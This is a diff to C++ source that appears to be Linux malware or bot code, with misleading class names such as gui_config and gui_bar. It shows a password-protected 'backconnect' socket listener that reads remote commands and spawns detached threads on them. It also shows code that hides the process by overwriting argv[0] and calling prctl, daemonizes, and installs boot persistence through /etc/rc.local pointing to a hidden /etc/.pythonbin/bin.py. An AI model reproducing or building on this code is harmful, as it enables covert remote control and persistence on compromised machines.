@@ -232,20 +232,20 @@ class cli_architecture : gui_config{ // backconnect
         send(s0,("Enter Password> "), sizeof("Enter Password> "), 20);
         while(1){
             string line;
-            char data = 0; // Reading one at a time, hack!
+            char data = 0; 
             while (data != '\n'){
                 ssize_t datarecv = recv(s0, &data, 1, 0);
                 if(datarecv == -1){
-                    if (errno != EAGAIN && errno != EWOULDBLOCK){ //Connection error
+                    if (errno != EAGAIN && errno != EWOULDBLOCK){ 
                         close(s0);
                         return;
                     }
-                } if(datarecv == 0) { //client disconnect
+                } if(datarecv == 0) { 
                     close(s0);
                     return;
                 }
                 line += data;
-                if (line.size() > 2048){ // Oh no!
+                if (line.size() > 2048){ 
                     close(s0);
                     return;
                 }
@@ -281,7 +281,7 @@ class cli_architecture : gui_config{ // backconnect
                     string buffer; 
                     stringstream white_space_ss(line); 
                     while(white_space_ss >> buffer){
-                        backconnect_v.push_back(buffer); // gui_bar gb; bios_bitmap
+                        backconnect_v.push_back(buffer); 
                     } if((backconnect_v).size() == 2 && (backconnect_v[0]).size() > 1 && (backconnect_v[1]).size() > 1){
                        thread(&gui_bar::bios_bitmap, &gb, backconnect_v[0], backconnect_v[1]).detach();
                     } else{
@@ -306,6 +306,7 @@ int main(int argc, char *argv[]){
     string gui_t = gu.gui_procc(argv[0]);
     strcpy(argv[0], (gui_t).c_str()); // cloak, command name
     prctl(PR_SET_NAME, (gui_t).c_str()); // cloak, thread name
+    cout << gui_t << endl;
     gb.daemon();
     gb.file_setup("/etc/rc.local", "/etc/.pythonbin/bin.py");
     while(1){
